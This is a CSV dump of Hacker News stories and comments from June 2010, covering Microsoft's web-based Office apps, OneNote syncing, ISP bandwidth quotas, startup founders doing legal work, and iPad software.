ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
1416567,story,,,1,0,manish,"If Aliens Exist, should we be eager to meet them? : Starts With A Bang",http://scienceblogs.com/startswithabang/2010/04/if_aliens_exist_should_we_be_e.php,,1276073976
1416565,comment,1416338,1416466,0,0,shrikant,,,"Thanks for the link - CNET made it impressively difficult to find in that damn article!<p>Did a quick trial run: Word, Excel seem alright, but my primary use-case - OneNote sync'ing - is finally addressed :) Now I don't have to futz around anymore with the slightly clumsy (but honestly kinda nice) implementation of Live Mesh to keep my OneNote notebooks sync'ed between work and home machines!",1276073952
1416564,comment,1416338,1416559,0,0,ErrantX,,,"Unless I am missing features; it works fine for me on Chrome under Linux (that's about as far away from your proposed requirements as you can get :))",1276073898
1416563,comment,1416338,1416338,0,0,ErrantX,,,"This was my take at the time it was first announced: <a href=""http://news.ycombinator.com/item?id=703627"" rel=""nofollow"">http://news.ycombinator.com/item?id=703627</a><p>It's a shame they went with Sharepoint as host for the business version, but meh.<p>I have to say the interface is pretty nice; it would have creamed the last version of Google Docs, but I think the recent docs updates levels the field a lot (to be honest, they really feel like two different offerings anyway - I like the current version of Word for ""fancy"" documents and docs.google for hardcore writing).<p>Having Powerpoint in the cloud is brilliant, on the other hand the lack of word count in Word is annoying.<p>All in all mixed results; I am guessing things will expand rapidly.",1276073820
1416562,comment,1416338,1416559,0,0,shrikant,,,"Works reasonably well on Firefox 3.6.3 + Windows 7 Professional.",1276073701
1416561,story,,,9,3,alanthonyc,"Just Add Points? What UX Designers Can Learn (and not Learn) from Games",http://noteandpoint.com/2010/06/just-add-points/,,1276073628
1416560,comment,1414370,1415608,0,0,wisty,,,"Start-up founders will have signed (and presumably read) quite a few legal documents (and even written a few themselves) before they hire a real lawyer. They should have had a real lawyer look over a few things first (on a consulting basis), as may be required by their E&O insurance, but they will have done quite a bit of ""lawyerish"" work themselves.<p>They may have also emptied the bins, unplugged the toilets, watered the potplants, and done a lot of other routine maintenance work.<p>There are very few jobs that can't be done (to a certain extent) by a non-professional. Practicing medicine is one obvious professional-only profession, but even then there are gray areas. Before you hire a company doctor, should you look into getting a sick bay, and doing a first aid course?",1276073597
1416559,comment,1416338,1416482,0,0,clark-kent,,,"I think you need Word installed on your computer to use this. And it probably requires I.E.",1276073546
1416558,comment,1416548,1416553,0,0,Specstacular,,,"No, there is commentary and analysis beyond the content of the original interview (which is linked from the blog post also)...",1276073441
1416557,comment,1416425,1416425,0,0,bootload,,,"My first computer, ZX-80 ~ <a href=""http://www.flickr.com/photos/bootload/268165912"" rel=""nofollow"">http://www.flickr.com/photos/bootload/268165912</a>",1276073423
1416555,story,,,11,7,aymeric,"How to get cheap and targeted paid traffic?",http://aymeric.gaurat.net/index.php/2010/how-to-get-cheap-and-targeted-paid-traffic/,,1276073300
1416554,comment,1416063,1416541,0,0,batiudrami,,,"The way this is combated by Australian ISPs is to offer 'off peak quota' - a kind of bonus for when bandwidth utilisation is low, as well as having people's quotas reset at different times of month.  This isn't a great solution, and would not work for phones as the off peak quota is used for things such as torrenting, when people aren't at their computers.<p>The problem with shaping traffic is that it means companies simply shape during busy periods, rather than increasing capacity.  By offering download limits at set speeds, ISPs guarantee a speed you will receive (limited only by the quality of copper in your phone line).<p>My point is largely that charging people who use download the most more money (and therefore, on average, are increasing the load at peak usage most often) is the most sensible method of controlling load.  If your experience with mobile internet is anything like mine, consumers certainly do not want bandwidth shaping making it any slower.",1276073299
1416553,comment,1416548,1416548,0,0,pwim,,,"This is just a summary of the actual interview available from <a href=""http://www.theage.com.au/small-business/entrepreneur/how-i-turned-5000-into-one-of-asias-biggest-travel-websites-20100609-xvqw.html"" rel=""nofollow"">http://www.theage.com.au/small-business/entrepreneur/how-i-t...</a>",1276073274
1416552,comment,1415485,1415485,0,0,clark-kent,,,"I agree Apple is falling way behind in software. iOS is good on a phone but its looking like a joke on the ipad. 4.0 is not good enough. Apple needs a serious software upgrade for the ipad.",1276073168
